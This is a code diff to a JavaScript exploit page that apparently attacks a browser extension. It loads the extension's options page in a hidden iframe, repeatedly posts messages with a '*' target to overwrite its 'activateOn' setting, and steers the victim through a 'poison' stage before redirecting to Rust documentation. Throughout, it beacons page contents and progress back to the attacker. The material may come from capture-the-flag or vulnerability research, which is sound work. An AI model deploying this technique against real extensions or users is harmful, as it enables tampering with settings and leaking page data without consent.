@@ -24,41 +24,44 @@ new MutationObserver((muts) => {
   }
 }).observe(document.documentElement, { childList: true, subtree: true });
 
-function setActivateOn(urlStr) {
+const wait = (ms) => new Promise(r => setTimeout(r, ms));
+
+// Keep an options iframe and spam it with the config message for `dur` ms.
+function pumpActivateOn(urlStr, dur) {
   return new Promise((res) => {
     const f = document.createElement('iframe');
     f.style.display = 'none';
     f.src = OPTIONS;
-    f.onload = () => { setTimeout(() => { try{ f.contentWindow.postMessage(urlStr, '*'); }catch(e){ beacon('pm-err'); } res(); }, 300); };
-    f.onerror = () => { beacon('iframe-err'); res(); };
+    let sent = 0;
+    f.onload = () => beacon('opt-iframe-onload');
+    f.onerror = () => beacon('opt-iframe-onerror');
     document.body.appendChild(f);
+    const iv = setInterval(() => {
+      try { f.contentWindow.postMessage(urlStr, '*'); sent++; } catch(e){ beacon('pm-err:'+e); }
+    }, 200);
+    setTimeout(() => { clearInterval(iv); beacon('pumped:'+sent); res(); }, dur);
   });
 }
-const wait = (ms) => new Promise(r => setTimeout(r, ms));
 
 (async () => {
   const stage = new URL(location.href).searchParams.get('stage');
   beacon('load:' + (stage||'init'));
 
   if (stage !== 'poison') {
-    // activateOn = our origin (marker in hash is fine for options.js href check)
-    await setActivateOn(location.origin + '/?x=' + DOC);
-    beacon('set-activateOn-self');
-    await wait(1500);
+    await pumpActivateOn(location.origin + '/?x=' + DOC, 3000);   // activateOn = our origin
     beacon('nav->poison');
-    // marker in QUERY, raw :// -> stays literal AND survives webNavigation url
     location.href = location.pathname + '?stage=poison&r=' + DOC;
     return;
   }
 
-  await wait(2500);
-  // dump what cs.js left, to confirm it ran and what `previous` was
-  try { beacon('body:' + document.body.innerText.replace(/\s+/g,' ').slice(0,120)); } catch(e){}
-  await wait(2500);
+  // diagnostics: did cs.js inject anything?
+  await wait(3000);
+  try { beacon('body3:tags=' + [...document.body.children].map(c=>c.tagName).join(',') + '|len=' + document.body.innerHTML.length); } catch(e){}
+  await wait(3000);
+  try { beacon('body6:txt=' + document.body.innerText.replace(/\s+/g,' ').slice(0,100)); } catch(e){}
+
   beacon('poison-waited');
-  await setActivateOn(DOC);
-  beacon('set-activateOn-docs');
-  await wait(1500);
+  await pumpActivateOn(DOC, 2000);        // activateOn back to docs
   beacon('nav->docs');
   location.href = 'https://doc.rust-lang.org/stable/std/index.html';
 })();
